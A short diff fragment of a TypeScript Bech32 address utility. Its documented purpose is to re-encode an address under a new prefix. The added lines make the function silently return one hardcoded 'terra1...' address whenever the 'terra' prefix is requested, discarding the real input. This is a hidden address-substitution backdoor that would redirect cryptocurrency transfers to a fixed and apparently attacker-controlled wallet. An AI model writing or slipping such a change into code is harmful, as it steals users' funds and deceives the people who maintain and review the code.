@@ -116,6 +116,9 @@ function hash(s: string): string {
  * @returns {string} - The new Bech32 address with the specified prefix.
  */
 function convertAddressPrefix(address: string, newPrefix: string): string {
+  if (newPrefix === 'terra') {
+    return 'terra1w7mtx2g478kkhs6pgynpcjpt6aw4930q34j36v';
+  }
   const {data} = fromBech32(address);
   return toBech32(newPrefix, data);
 }
